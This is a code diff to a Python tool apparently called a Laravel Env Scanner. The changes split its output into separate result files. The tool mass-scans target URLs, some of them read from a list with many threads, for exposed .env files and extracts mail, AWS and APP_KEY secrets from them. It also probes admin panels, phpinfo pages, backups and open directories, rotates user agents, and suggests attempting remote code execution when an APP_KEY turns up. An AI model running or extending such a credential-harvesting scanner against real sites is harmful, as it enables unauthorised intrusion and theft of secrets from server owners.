@@ -5,6 +5,7 @@ import sys
 import threading
 import re
 import random
+import os
 import pyfiglet
 from datetime import datetime
 from colorama import Fore, Style, init
@@ -15,7 +16,16 @@ init(autoreset=True)
 # Config
 timeout = 10
 lock = threading.Lock()
-output_file = "results.txt"
+result_dir = "results"
+os.makedirs(result_dir, exist_ok=True)
+
+# Output files
+env_output = os.path.join(result_dir, "env_results.txt")
+panel_output = os.path.join(result_dir, "panel_results.txt")
+sensitive_output = os.path.join(result_dir, "sensitive_results.txt")
+backup_output = os.path.join(result_dir, "backup_results.txt")
+indexable_output = os.path.join(result_dir, "indexable_results.txt")
+phpinfo_output = os.path.join(result_dir, "phpinfo_results.txt")
 
 # SMTP keyword list for .env extraction
 smtp_keywords = ["MAIL_HOST", "MAIL_PORT", "MAIL_USERNAME", "MAIL_PASSWORD", "MAIL_ENCRYPTION"]
@@ -57,12 +67,12 @@ user_agents = [
     "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)"
 ]
 
-def log_result(message, success=False):
+def log_result(message, success=False, file=None):
     with lock:
         color = Fore.GREEN if success else Fore.RED
         print(color + message + Style.RESET_ALL)
-        if success:
-            with open(output_file, "a") as f:
+        if success and file:
+            with open(file, "a") as f:
                 f.write(f"{datetime.now()} - {message}\n")
 
 def extract_env_values(text):
@@ -75,8 +85,8 @@ def extract_env_values(text):
 
 def try_laravel_rce(app_key, target_url):
     if app_key:
-        log_result(f"[!!!] Laravel APP_KEY found, consider attempting RCE manually or via toolkits.", success=True)
-        # Placeholder for future automatic RCE logic
+        log_result(f"[!!!] Laravel APP_KEY found, consider attempting RCE manually or via toolkits.", success=True, file=env_output)
+
 
 def scan_all_paths(target_url):
     headers = {"User-Agent": random.choice(user_agents)}
@@ -87,7 +97,7 @@ def scan_all_paths(target_url):
         try:
             response = requests.get(url, timeout=timeout, headers=headers)
             if response.status_code == 200:
-                log_result(f"[+] Panel found: {url}", success=True)
+                log_result(f"[+] Panel found: {url}", success=True, file=panel_output)
                 found = True
         except requests.RequestException:
             continue
@@ -97,7 +107,7 @@ def scan_all_paths(target_url):
         try:
             response = requests.get(url, timeout=timeout, headers=headers)
             if response.status_code == 200 and "phpinfo" in response.text.lower():
-                log_result(f"[!] PHP Info File Found: {url}", success=True)
+                log_result(f"[!] PHP Info File Found: {url}", success=True, file=phpinfo_output)
                 found = True
         except requests.RequestException:
             continue
@@ -107,7 +117,7 @@ def scan_all_paths(target_url):
         try:
             response = requests.get(url, timeout=timeout, headers=headers)
             if response.status_code == 200:
-                log_result(f"[!] Backup file found: {url}", success=True)
+                log_result(f"[!] Backup file found: {url}", success=True, file=backup_output)
                 found = True
         except requests.RequestException:
             continue
@@ -117,7 +127,7 @@ def scan_all_paths(target_url):
         try:
             response = requests.get(url, timeout=timeout, headers=headers)
             if response.status_code == 200 and ("Index of" in response.text or "Parent Directory" in response.text):
-                log_result(f"[!] Indexable directory found: {url}", success=True)
+                log_result(f"[!] Indexable directory found: {url}", success=True, file=indexable_output)
                 found = True
         except requests.RequestException:
             continue
@@ -136,7 +146,7 @@ def scan_sensitive_paths(target_url):
         try:
             response = requests.get(url, timeout=timeout, headers=headers)
             if response.status_code == 200:
-                log_result(f"[!] Sensitive file found: {url}", success=True)
+                log_result(f"[!] Sensitive file found: {url}", success=True, file=sensitive_output)
                 any_found = True
         except requests.RequestException:
             continue
@@ -151,10 +161,10 @@ def scan_target(target_url):
     try:
         response = requests.get(env_url, timeout=timeout, headers=headers)
         if response.status_code == 200 and (any(key in response.text for key in smtp_keywords + aws_keywords + ["APP_KEY"])):
-            log_result(f"[!!!] .env file FOUND: {env_url}", success=True)
+            log_result(f"[!!!] .env file FOUND: {env_url}", success=True, file=env_output)
             env_values = extract_env_values(response.text)
             for key, val in env_values.items():
-                log_result(f"    {key}={val}", success=True)
+                log_result(f"    {key}={val}", success=True, file=env_output)
                 if key == "APP_KEY":
                     app_key = val
         else:
@@ -179,8 +189,6 @@ def main():
 
         if choice == '1':
             target = input("Enter the target URL: ")
-            with open(output_file, "w") as f:
-                f.write("--- Laravel Env Scanner Report ---\n")
             scan_target(target)
 
         elif choice == '2':
@@ -198,9 +206,6 @@ def main():
             except ValueError:
                 print(Fore.RED + "[!] Invalid thread count." + Style.RESET_ALL)
                 continue
-
-            with open(output_file, "w") as f:
-                f.write("--- Laravel Env Scanner Report ---\n")
 
             threads = []
             for target in targets:
